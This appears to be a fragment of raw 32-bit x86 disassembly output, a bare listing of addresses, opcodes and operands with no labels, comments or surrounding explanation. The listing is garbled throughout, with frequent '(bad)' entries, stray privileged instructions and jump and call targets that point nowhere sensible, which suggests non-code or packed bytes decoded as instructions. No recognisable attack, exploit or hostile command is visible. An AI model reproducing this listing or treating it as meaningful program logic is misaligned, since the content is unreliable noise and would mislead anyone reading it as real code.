  432238:	test   DWORD PTR [edx],eax
  43223a:	xadd   esp,esi
  43223d:	pop    es
  43223e:	add    cl,dl
  432240:	mov    eax,ecx
  432242:	or     al,0x45
  432244:	(bad)  
  432245:	push   eax
  432246:	add    DWORD PTR [edx+0x0],eax
  432249:	add    ecx,DWORD PTR [ecx]
  43224b:	and    dh,cl
  43224d:	call   0xc72b1d
  432252:	add    DWORD PTR [ebp+0x0],edx
  432255:	mov    esp,DWORD PTR [ebp+0x18]
  432258:	add    BYTE PTR [eax+0x50],cl
  43225b:	xor    eax,DWORD PTR [eax]
  43225d:	add    esp,DWORD PTR [esi+0x3b]
  432260:	inc    ebp
  432261:	je     0x4321e6
  432263:	push   ecx
  432264:	dec    BYTE PTR [ebp-0x77]
  432267:	add    eax,esi
  432269:	or     al,0x5e
  43226b:	inc    eax
  43226c:	add    BYTE PTR [ebx],al
  43226e:	data16 and BYTE PTR [ebp+0x50],al
  432272:	sub    DWORD PTR [ecx],0xfffffff8
  432275:	add    BYTE PTR [ebp-0x75],ah
  432278:	add    BYTE PTR [eax],bl
  43227a:	enter  0x894d,0x8b
  43227e:	int3   
  43227f:	loopne 0x432243
  432281:	rol    BYTE PTR [eax],0x33
  432284:	lea    cx,[ebp+0xa]
  432288:	data16 jb 0x4322d0
  43228b:	add    BYTE PTR [ebx+0x44890855],cl
  432291:	sbb    ah,al
  432293:	inc    ebp
  432294:	cmp    al,0xf
  432296:	add    BYTE PTR [edx+0x66],dl
  432299:	xor    ecx,DWORD PTR [eax]
  43229b:	sub    eax,DWORD PTR [edx]
  43229d:	mov    eax,DWORD PTR [eax]
  43229f:	or     al,0x66
  4322a1:	ror    edx,cl
  4322a3:	dec    ebp
  4322a4:	inc    ebp
  4322a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322ab:	cld    
  4322ac:	or     BYTE PTR [edi+0x4501dd],dl
  4322b2:	ret    0xecce
  4322b5:	retf   
  4322b6:	(bad)  
  4322b7:	dec    ebp
  4322b8:	mov    al,0x8b
  4322ba:	loopne 0x4322dc
  4322bc:	cmp    ecx,DWORD PTR [edx]
  4322be:	inc    ebp
  4322bf:	daa    
  4322c0:	loopne 0x432249
  4322c2:	in     al,dx
  4322c3:	add    edi,eax
  4322c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4322cb:	push   ebp
  4322cc:	inc    ebp
  4322cd:	xor    ebx,edx
  4322cf:	add    ebp,esp
  4322d1:	push   edx
  4322d2:	push   bp
  4322d4:	inc    ebp
  4322d5:	(bad)  
  4322d6:	in     eax,dx
  4322d7:	push   esp
  4322d8:	(bad)  
  4322d9:	inc    edx
  4322db:	sbb    al,0x33
  4322dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322e4:	add    BYTE PTR [ebp+0x46],0x8b
  4322e8:	jmp    0xf98b:0x100041c8
  4322ef:	xor    esi,DWORD PTR [edx+0x3]
  4322f2:	mov    ecx,DWORD PTR [edi]
  4322f4:	fmul   DWORD PTR [edx]
  4322f6:	add    BYTE PTR [eax],al
  4322f8:	lea    eax,[ebx-0x4700273c]
  4322fe:	add    al,0x4f
  432300:	pop    DWORD PTR [eax]
  432302:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432308:	push   edx
  432309:	inc    WORD PTR [ebp+0x8]
  43230d:	mov    eax,0x514f4d
  432312:	(bad)
  432316:	add    al,al
  432318:	xor    DWORD PTR [ebx-0x74baf730],eax
  43231e:	test   DWORD PTR [esi+0x74],esp
  432321:	inc    ebp
  432322:	mov    DWORD PTR [eax+0xa4e08],edi
  432328:	add    BYTE PTR [ecx-0x76c435bb],cl
  43232e:	or     dh,cl
  432330:	or     eax,0x8b8d5045
  432335:	inc    ebp
  432336:	mov    WORD PTR [ecx+0x3b8a00],?
  43233c:	jne    0x432371
  43233e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432344:	add    DWORD PTR [ebx],eax
  432346:	add    bh,bh
  432348:	adc    DWORD PTR [eax],ecx
  43234a:	adc    DWORD PTR [ebp+0x55],edi
  43234d:	push   es
  43234e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432354:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43235b:	inc    ebp
  43235c:	mov    esp,edi
  43235e:	or     al,0xda
  432360:	push   eax
  432361:	(bad)  
  432362:	jne    0x432318
  432364:	call   0x3b1c53
  432369:	inc    ebp
  43236a:	sar    BYTE PTR [eax],0x84
  43236d:	in     al,dx
  43236e:	add    bh,al
  432370:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432377:	(bad)  
  432378:	and    al,al
  43237a:	fs in  eax,dx
  43237c:	inc    DWORD PTR [ebp-0x7b]
  43237f:	jle    0x432390
  432381:	leave  
  432382:	scas   al,BYTE PTR es:[edi]
  432383:	inc    esp
  432384:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43238b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432392:	call   DWORD PTR [edi]
  432394:	shr    ah,0x84
  432397:	xchg   DWORD PTR [eax],eax
  432399:	add    DWORD PTR [eax],eax
  43239b:	add    bh,bh
  43239d:	dec    ebp
  43239e:	and    BYTE PTR [ecx-0x38],dl
  4323a1:	push   eax
  4323a2:	dec    DWORD PTR [ebx+0xfd885]
  4323a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323ae:	mov    WORD PTR [ecx+0x0],ss
  4323b1:	lea    ecx,[ebx+0x108b20d8]
  4323b7:	mov    WORD PTR [edx],ds
  4323b9:	add    BYTE PTR [edi+0xff01ff],al
  4323bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4323c2:	push   ecx
  4323c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323c7:	inc    ebp
  4323c8:	in     al,0xeb
  4323ca:	jno    0x432357
  4323cc:	push   edx
  4323cd:	mov    DWORD PTR [eax-0x28],edx
  4323d0:	mov    eax,DWORD PTR [ebp+0x20]
  4323d3:	je     0x43235c
  4323d5:	mov    eax,DWORD PTR [ecx]
  4323d7:	sbb    BYTE PTR [eax],al
  4323d9:	pop    DWORD PTR [eax]
  4323db:	add    esi,eax
  4323dd:	add    bl,al
  4323df:	adc    DWORD PTR [edi],esi
  4323e1:	jmp    0x8bce7433
  4323e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4323ed:	jne    0x43237a
  4323ef:	mov    ecx,DWORD PTR [eax]
  4323f1:	in     al,0x75
  4323f3:	pop    DWORD PTR [ecx+0x5401]
  4323f9:	push   edx
  4323fa:	inc    DWORD PTR [ebx]
  4323fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432402:	add    BYTE PTR [edi+0x9],dl
  432405:	call   DWORD PTR [esi]
  432407:	and    dl,al
  432409:	and    bh,bh
  43240b:	inc    edi
  43240d:	test   eax,edx
  43240f:	sldt   ebx
  432412:	xor    al,BYTE PTR [eax]
  432414:	pushf  
  432415:	(bad)  
  432416:	jmp    0x432424
  432418:	mov    eax,edi
  43241a:	or     al,0x75
  43241c:	inc    eax
  43241d:	call   0x431b25
  432422:	mov    eax,eax
  432424:	loopne 0x4323aa
  432426:	inc    ebp
  432427:	add    BYTE PTR [ebx+0x1451c00],cl
  43242d:	mov    eax,DWORD PTR [ebp+0x20]
  432430:	add    edi,ecx
  432432:	add    BYTE PTR [eax],ch
  432434:	cmp    edi,0x18
  432437:	test   DWORD PTR [ebp+0xf],esi
  43243a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432441:	jne    0x432445
  432443:	call   0xffa21f08
  432448:	leave  
  432449:	rcr    BYTE PTR [esp+eax*4],0x55
  43244d:	add    ah,ch
  43244f:	add    BYTE PTR [edi-0x48fef979],dh
  432455:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43245c:	inc    esp
  43245d:	mov    ebx,DWORD PTR [eax]
  43245f:	fcom   st(2)
  432461:	add    BYTE PTR [edi],bl
  432463:	lea    ecx,[eax-0x18]
  432466:	(bad)  
  432467:	push   DWORD PTR [ecx]
  432469:	call   0xffb571cb
  43246e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432472:	fstp   DWORD PTR [esi+ebx*8]
  432475:	push   ebp
  432476:	pop    ebp
  432477:	mov    esi,DWORD PTR [edx-0x38]
  43247a:	add    DWORD PTR [eax],0x28
  43247d:	mov    edi,DWORD PTR [ebx]
  43247f:	xor    esi,DWORD PTR [edx+0x3]
  432482:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432486:	pop    ebp
  432487:	or     al,0x4
  432489:	inc    ecx
  43248a:	push   ebp
  43248b:	(bad)  
  43248c:	in     al,dx
  43248d:	or     ah,ch
  43248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432490:	xbegin 0xffc89a86
  432496:	clc    
  432497:	adc    al,0x45
  432499:	div    BYTE PTR [edx]
  43249b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324a8:	add    BYTE PTR [ecx+0x66],dh
  4324ab:	add    eax,DWORD PTR [ebp+0x52]
  4324ae:	adc    eax,0xffffffa0
  4324b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324b7:	test   DWORD PTR [eax],eax
  4324b9:	clc    
  4324ba:	data16 or al,BYTE PTR [ebp+0x45]
  4324be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324c5:	rol    BYTE PTR [ebp+0x45],1
  4324c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324d4:	push   ebx
  4324d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324d9:	jge    0x43250e
  4324db:	add    BYTE PTR [esi+0x4],dl
  4324de:	jne    0x432545
  4324e0:	mov    edx,0x457200
  4324e5:	jmp    0x4324a9
  4324e7:	xor    edi,DWORD PTR [ebx]
  4324e9:	pop    edi
  4324ea:	cvtdq2ps xmm7,xmm0
  4324ed:	ret    0x0
  4324f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4324f6:	xor    ecx,DWORD PTR [edi]
  4324f8:	add    eax,DWORD PTR [ecx+0x3b]
  4324fb:	push   ebx
  4324fc:	rdpmc  
  4324fe:	out    0x8d,al
  432500:	add    BYTE PTR [eax],cl
  432502:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432508:	ret    0x450c
  43250b:	sbb    al,0x8b
  43250d:	cmp    eax,esi
  43250f:	or     cl,al
  432511:	or     al,0xc2
  432513:	pop    eax
  432514:	inc    ebp
  432515:	add    ecx,DWORD PTR [edi]
  432517:	add    esi,DWORD PTR [ebp+0x39]
  43251a:	invd   
  43251c:	jge    0x432528
  43251e:	mov    eax,0x478ac0
  432523:	cli    
  432524:	xor    esp,ecx
  432526:	mov    ebx,0x5b8ac0
  43252b:	ret    0x33
  43252e:	mov    eax,0x833b8b
  432533:	sub    BYTE PTR [ebx],al
  432535:	inc    ebp
  432536:	xor    ax,di
  432539:	pushf  
  43253a:	inc    bh
  43253c:	mov    esp,esp
  43253e:	hlt    
  43253f:	test   DWORD PTR [ebp-0x8],esi
  432542:	mov    eax,DWORD PTR [ebp-0x14]
  432545:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43254b:	dec    edi
  43254c:	or     BYTE PTR [eax],al
  43254e:	jne    0x4324d9
  432550:	mov    esi,esp
  432552:	call   0x77a9b117
  432557:	inc    ebp
  432558:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43255e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432564:	add    BYTE PTR [esi+0x7d],ah
  432567:	inc    ebp
  432568:	mov    bx,WORD PTR [ebp+0x8]
  43256c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432573:	inc    ebp
  432574:	mov    bx,di
  432577:	lock test BYTE PTR [ecx+0x7000801],bh
  43257e:	jge    0x432541
  432580:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432586:	cli    
  432587:	xor    bl,bh
  432589:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43258f:	test   BYTE PTR [eax],cl
  432591:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432598:	cmp    ebp,eax
  43259a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325a1:	test   BYTE PTR [ebp+0x1],bh
  4325a4:	mov    ebx,0x458a00
  4325a9:	xor    esi,DWORD PTR [ebx]
  4325ab:	add    esp,DWORD PTR [esi-0x77]
  4325ae:	pop    ebp
  4325af:	loopne 0x432617
  4325b1:	inc    ebp
  4325b2:	clc    
  4325b3:	xor    edi,DWORD PTR [ebx]
  4325b5:	add    esi,DWORD PTR [edx-0x77]
  4325b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4325bc:	mov    ebx,0xb78afc
  4325c1:	hlt    
  4325c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4325c5:	add    BYTE PTR [ebp+0x66],bl
  4325c8:	data16 lock clc 
  4325cb:	cmp    al,0x3b
  4325cd:	add    BYTE PTR [edi+0x66],dh
  4325d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325d4:	ltr    WORD PTR [ebp+0x66]
  4325d8:	add    esi,eax
  4325da:	add    di,WORD PTR [ebp+0x2b]
  4325de:	data16 data16 jge 0x43265f
  4325e2:	mov    ebx,0xe08a8b
  4325e7:	jge    0x43261c
  4325e9:	data16 data16 xor al,0x5d
  4325ed:	data16 data16 jne 0x4325e9
  4325f1:	mov    edi,DWORD PTR [ebx]
  4325f3:	fdiv   QWORD PTR [edx+0x7d]
  4325f6:	data16 data16 jge 0x43262e
  4325fa:	mov    ebx,0x758a66
  4325ff:	mov    esi,0x667233
  432604:	pop    ebp
  432605:	or     BYTE PTR [esi+0x0],ah
  432608:	clc    
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	lock ja 0x432599
  43260e:	(bad)  
  432610:	jge    0x432609
  432612:	invd   
  432614:	pop    ebp
  432615:	add    BYTE PTR [ebx],al
  432617:	(bad)  
  432618:	cmp    di,WORD PTR [ebp+0xf]
  43261c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432620:	mov    bx,WORD PTR [ebp-0x10]
  432624:	pop    bp
  432626:	fbstp  TBYTE PTR [ebx]
  432628:	test   DWORD PTR [ebx],eax
  43262a:	add    BYTE PTR [ebx],bh
  43262c:	add    BYTE PTR [esi+0x7d],ah
  43262f:	jge    0x4325bc
  432631:	data16 in al,dx
  432633:	pop    ebp
  432634:	stc    
  432635:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43263c:	mov    edi,ebx
  43263e:	in     al,dx
  43263f:	test   BYTE PTR [ebp+0x0],bh
  432642:	mov    eax,DWORD PTR [eax]
  432644:	call   0xbd401fd4
  432649:	cmp    al,0x9b
  43264b:	add    BYTE PTR [edx],dh
  43264d:	mov    bx,di
  432650:	call   0x8b4ba3e0
  432655:	add    ebp,esp
  432657:	mov    bx,di
  43265a:	jnp    0x432682
  43265c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432662:	mov    eax,DWORD PTR [eax]
  432664:	call   0x7c3eb1cf
  432669:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43266f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432674:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43267e:	fisttp WORD PTR [ecx-0x7401f77b]
  432684:	(bad)  
  432685:	cld    
  432686:	jne    0x4326c4
  432688:	xor    eax,DWORD PTR [eax]
  43268a:	mov    esp,DWORD PTR [esi-0x10]
  43268d:	sti    
  43268e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432695:	data16 adc bl,bh
  432698:	push   ebp
  432699:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326a0:	mov    WORD PTR [eax],es
  4326a2:	fwait
  4326a3:	data16 xor bh,bl
  4326a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326ac:	mov    esp,DWORD PTR [esi-0x14]
  4326af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326b5:	or     al,0x2b
  4326b7:	mov    bh,0xba
  4326b9:	hlt    
  4326ba:	mov    bh,bl
  4326bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326c2:	dec    esi
  4326c3:	or     al,0x0
  4326c5:	mov    edi,DWORD PTR [ebx]
  4326c7:	or     BYTE PTR [ebp+0x3b],dh
  4326ca:	mov    ecx,DWORD PTR [edi]
  4326cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326d2:	xor    al,0xd8
  4326d4:	pop    bp
  4326d6:	lock xor esi,DWORD PTR [ebx]
  4326d9:	lea    esp,[esi+0x1f]
  4326dc:	icebp  
  4326dd:	jb     0x4326e3
  4326df:	add    al,al
  4326e1:	jge    0x4326ef
  4326e3:	mov    eax,eax
  4326e5:	fsubr  st,st(3)
  4326e7:	pop    ebp
  4326e8:	mov    esi,DWORD PTR [ebx]
  4326ea:	in     al,0x8d
  4326ec:	rcr    DWORD PTR [edi],0xc2
  4326ef:	jb     0x43274f
  4326f1:	add    cl,cl
  4326f3:	jge    0x432701
  4326f5:	mov    edx,DWORD PTR [ebp-0x20]
  4326f8:	in     al,dx
  4326f9:	pop    ebp
  4326fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4326ff:	cmp    di,WORD PTR [ebp+0x0]
  432703:	mov    ebp,DWORD PTR [ebx]
  432705:	fdivr  QWORD PTR [esi+0x668a5d]
  43270b:	cmp    al,0x33
  43270d:	mov    si,0x4e7d
  432711:	mov    eax,DWORD PTR [eax]
  432713:	lock inc ebp
  432715:	mov    esi,DWORD PTR [eax]
  432717:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43271e:	clc    
  43271f:	(bad)  
  432720:	cmp    edi,DWORD PTR [ebx]
  432722:	je     0x432733
  432724:	push   ebx
  432725:	loopne 0x432736
  432727:	dec    ecx
  432729:	mov    esp,DWORD PTR [ebp-0x1c]
  43272c:	int    0xf1
  43272e:	mov    esi,0x703084d
  432733:	pcmpgtd mm6,mm1
  432736:	add    BYTE PTR [ebp+0x66],dh
  432739:	jmp    0x432706
  43273b:	mov    eax,DWORD PTR [ebx]
  43273d:	lock push ebp
  43273f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432745:	or     bh,dl
  432747:	jb     0x432747
  432749:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43274f:	loopne 0x432751
  432751:	jne    0x432755
  432753:	data16 add BYTE PTR [esi+eiz*2],dh
  432757:	mov    ecx,ebx
  432759:	data16 cmp al,0xf1
  43275c:	add    BYTE PTR [esi+eiz*2],bh
  43275f:	add    bl,cl
  432761:	retw   0xf2
  432765:	ret    0x66
  432768:	retf   
  432769:	enterw 0x4df1,0x19
  43276e:	pop    edi
  43276f:	jne    0x4326f2
  432771:	mov    esi,DWORD PTR [eax]
  432773:	call   0x77b7b314
  432778:	xor    ebp,DWORD PTR [ebx]
  43277a:	lea    esp,[esi+0x48]
  43277d:	repnz in eax,0x3b
  432780:	add    BYTE PTR [ebp-0x37],dh
  432783:	xor    edx,DWORD PTR [ebp-0x15]
  432786:	in     al,dx
  432787:	xor    edx,DWORD PTR [esi+0x40]
  43278a:	mov    DWORD PTR [edi],0x338545fc
  432790:	clc    
  432791:	add    esi,DWORD PTR [ecx]
  432793:	pop    edi
  432794:	pushf  
  432795:	pop    ebx
  432796:	call   0xff44275d
  43279b:	mov    edi,eax
  43279d:	push   ecx
  43279e:	pop    es
  43279f:	mov    edi,DWORD PTR [eax]
  4327a1:	push   esi
  4327a2:	inc    esi
  4327a3:	add    bh,BYTE PTR [esi+0x0]
  4327a6:	popa   
  4327a7:	data16 (bad) 
  4327a9:	into   
  4327aa:	gs cmp al,0xcd
  4327ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327b3:	ret    0x66
  4327b6:	add    bh,al
  4327b8:	add    bh,ah
  4327ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4327c0:	cmp    al,0x9c
  4327c2:	add    BYTE PTR [esi+0x66],ah
  4327c5:	into   
  4327c6:	ret    
  4327c7:	pop    ebp
  4327c8:	adc    BYTE PTR [edi+0x0],dl
  4327cb:	mov    bh,0x66
  4327cd:	mov    edi,0xff038dc3
  4327d2:	jne    0x432828
  4327d4:	lea    edx,[ecx+0x1]
  4327d7:	mov    ebx,0xd64ff1
  4327dc:	sar    DWORD PTR [ebx],1
  4327de:	test   BYTE PTR [ebp+0x36],dh
  4327e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327e5:	push   edi
  4327e6:	xor    BYTE PTR [ebx],0x38
  4327e9:	mov    esi,ebx
  4327eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4327f1:	ss inc ebp
  4327f3:	fs pop ebx
  4327f5:	mov    ebx,0x9c3b30
  4327fa:	je     0x432827
  4327fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432802:	mov    WORD PTR [ebx],?
  432804:	ss mov ebx,0x8b4e64
  43280a:	pop    edi
  43280b:	cmp    ecx,ecx
  43280d:	jne    0x432864
  43280f:	mov    ebp,esp
  432811:	cld    
  432812:	push   esi
  432813:	pop    ebx
  432814:	inc    ebp
  432815:	stc    
  432816:	xor    BYTE PTR [ebp+0x9bef89c],al
  43281c:	test   esi,ecx
  43281e:	clc    
  43281f:	test   dl,dl
  432821:	cmp    bh,bh
  432823:	fs pop si
  432826:	or     bl,al
  432828:	add    cl,BYTE PTR [ebx+0x57665100]
  43282e:	retf   0x3c45
  432831:	xor    BYTE PTR [eax],al
  432833:	pushf  
  432834:	mov    si,0x85ca
  432838:	ret    0xf8
  43283b:	pop    ebx
  43283c:	dec    dx
  43283f:	mov    edx,DWORD PTR [edi-0x76]
  432842:	push   edi
  432843:	add    al,0xb7
  432845:	xor    al,0xba
  432847:	cmp    al,0x8d
  432849:	je     0x43284a
  43284b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43284f:	lea    edi,[ebx+0x544fff]
  432855:	push   ecx
  432856:	cmp    edx,DWORD PTR [ebx+0x75]
  432859:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43285f:	add    BYTE PTR [ebx],dh
  432861:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432867:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43286e:	mov    ebx,0x3b3b00
  432873:	jne    0x4328a0
  432875:	mov    DWORD PTR [ebx+0x728afc],edi
  43287b:	xor    esi,DWORD PTR [ebx]
  43287d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432883:	push   edi
  432884:	cmp    esp,ebp
  432886:	jne    0x432888
  432888:	sbb    DWORD PTR [eax],0x8085c3fc
  43288e:	clc    
  43288f:	inc    esi
  432890:	pop    ebx
  432891:	sti    
  432892:	add    eax,0xeb8bc075
  432897:	cld    
  432898:	xor    edi,DWORD PTR ds:0xf8c3855e
  43289e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328a1:	rol    DWORD PTR [ebp-0x37],0xf
  4328a5:	mov    DWORD PTR [eax],ecx
  4328a7:	inc    edi
  4328a8:	(bad)  
  4328a9:	in     eax,0xfe
  4328ab:	add    bh,bh
  4328ad:	(bad)  
  4328ae:	mov    esi,0xc38a5e
  4328b3:	mov    esi,DWORD PTR [ebx]
  4328b5:	push   ecx
  4328b6:	mov    edi,0xfc4ec7
  4328bb:	test   DWORD PTR [ebp-0x8],edx
  4328be:	xor    di,ax
  4328c1:	pushf  
  4328c2:	sub    ebp,eax
  4328c4:	inc    ebp
  4328c5:	(bad)  
  4328c6:	sub    edi,edi
  4328c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328ce:	inc    ebp
  4328cf:	add    BYTE PTR [esi+0x2b],ah
  4328d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328d8:	cmp    al,0x33
  4328da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328e0:	(bad)  
  4328e1:	cmp    esi,DWORD PTR [ebx]
  4328e3:	je     0x43289d
  4328e5:	push   ebx
  4328e6:	dec    esi
  4328e7:	str    ecx
  4328ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4328ed:	int    0x33
  4328ef:	mov    edi,0x789085f
  4328f4:	mov    edx,DWORD PTR [eax]
  4328f6:	cld    
  4328f7:	add    cl,cl
  4328f9:	data16 add al,0xcb
  4328fc:	push   ebp
  4328fd:	add    ebp,esp
  4328ff:	jne    0x4328ed
  432901:	(bad)  
  432902:	mov    DWORD PTR [ecx],0xd685f7ec
  432908:	clc    
  432909:	xlat   BYTE PTR ds:[ebx]
  43290a:	inc    ebp
  43290b:	mov    esi,DWORD PTR [edx]
  43290d:	push   eax
  43290e:	pushf  
  43290f:	in     eax,0x8b
  432911:	add    ah,ch
  432913:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432917:	add    ax,0x72cb
  43291b:	cmp    al,0x0
  43291d:	add    BYTE PTR [ebp+0x66],al
  432920:	(bad)  
  432921:	retf   
  432922:	lock ret 0x85
  432926:	clc    
  432927:	inc    bp
  432929:	retf   
  43292a:	cmp    eax,0xc77d9cc8
  43292f:	xor    ah,bh
  432931:	pushf  
  432932:	test   DWORD PTR [edi-0x8],ebx
  432935:	je     0x43297c
  432937:	xor    esi,DWORD PTR ds:0x7020840
  43293d:	ror    BYTE PTR [ebp-0x37],0x8d
  432941:	push   ebp
  432942:	add    esp,ebp
  432944:	jb     0x4328d1
  432946:	add    BYTE PTR [eax],cl
  432948:	dec    ebp
  432949:	mov    bh,0x81
  43294b:	push   esi
  43294c:	push   esp
  43294d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432954:	xor    al,BYTE PTR [eax]
  432956:	mov    edx,DWORD PTR [edi+0x10]
  432959:	(bad)  
  43295a:	scas   eax,DWORD PTR es:[edi]
  43295b:	ret    0x3b
  43295e:	jns    0x3b442651
  432964:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432968:	dec    ebp
  432969:	or     BYTE PTR [ebx],ch
  43296b:	ret    0x458b
  43296e:	lock jmp 0x432962
  432971:	mov    ecx,DWORD PTR [eax]
  432973:	or     BYTE PTR [edi],al
  432975:	mov    ecx,eax
  432977:	xor    DWORD PTR [edx+0x2],0x0
  43297b:	mov    bh,0xc1
  43297d:	adc    BYTE PTR [eax],dh
  43297f:	iret   
  432980:	inc    ebp
  432981:	mov    DWORD PTR [ebx],0x4dfff8c4
  432987:	inc    BYTE PTR [ebx]
  432989:	ret    0xf8
  43298c:	adc    DWORD PTR [esi+0x10],esp
  43298f:	clc    
  432990:	dec    ecx
  432991:	fisttp WORD PTR [ecx+0x456604c0]
  432997:	add    dh,BYTE PTR ds:0x75e0845
  43299d:	ret    0x4d
  4329a0:	lea    ecx,[ebx+0x18728301]
  4329a6:	add    BYTE PTR [ebp+0x45],al
  4329a9:	xor    ecx,ebp
  4329ab:	pushf  
  4329ac:	add    bh,al
  4329ae:	add    al,ch
  4329b0:	inc    ebp
  4329b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329b7:	xor    eax,0x781084d
  4329bc:	push   esp
  4329bd:	fwait
  4329be:	push   ecx
  4329bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329c5:	inc    ebp
  4329c6:	cmp    edi,DWORD PTR [ecx]
  4329c8:	jbe    0x432966
  4329ca:	mov    eax,edi
  4329cc:	or     ah,dh
  4329ce:	inc    ebp
  4329cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329db:	in     al,dx
  4329dc:	hlt    
  4329dd:	push   esp
  4329de:	push   esp
  4329df:	push   ecx
  4329e0:	push   ecx
  4329e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329e7:	fwait
  4329e8:	fwait
  4329e9:	xor    dh,BYTE PTR [edx]
  4329eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4329f1:	or     BYTE PTR [ebp+0x7],al
  4329f4:	mov    eax,ecx
  4329f6:	clc    
  4329f7:	jb     0x4329ba
  4329f9:	add    BYTE PTR [ebp+0x55],cl
  4329fc:	or     DWORD PTR [edi],0xc251d154
  432a02:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a0c:	mov    edi,eax
  432a0e:	or     cl,al
  432a10:	inc    ebp
  432a11:	dec    ebp
  432a12:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a18:	or     WORD PTR [ecx],0x899b
  432a1d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a23:	mov    edx,DWORD PTR [ecx+0x8]
  432a26:	mov    eax,DWORD PTR [ebp-0x8]
  432a29:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a30:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a36:	inc    ebp
  432a37:	dec    eax
  432a38:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a3e:	add    edx,DWORD PTR [ecx-0x8]
  432a41:	mov    ecx,DWORD PTR [ecx]
  432a43:	clc    
  432a44:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a4b:	mov    ecx,ebp
  432a4d:	clc    
  432a4e:	(bad)  
  432a4f:	popf   
  432a50:	inc    DWORD PTR [eax]
  432a52:	ret    0x8b
  432a55:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a5b:	mov    edi,esp
  432a5d:	hlt    
  432a5e:	test   ecx,esi
  432a60:	clc    
  432a61:	or     BYTE PTR [ebp+0x7],al
  432a64:	xor    al,cl
  432a66:	pushf  
  432a67:	jb     0x432a9c
  432a69:	add    BYTE PTR [eax-0x3f],al
  432a6c:	inc    eax
  432a6d:	daa    
  432a6e:	inc    ebp
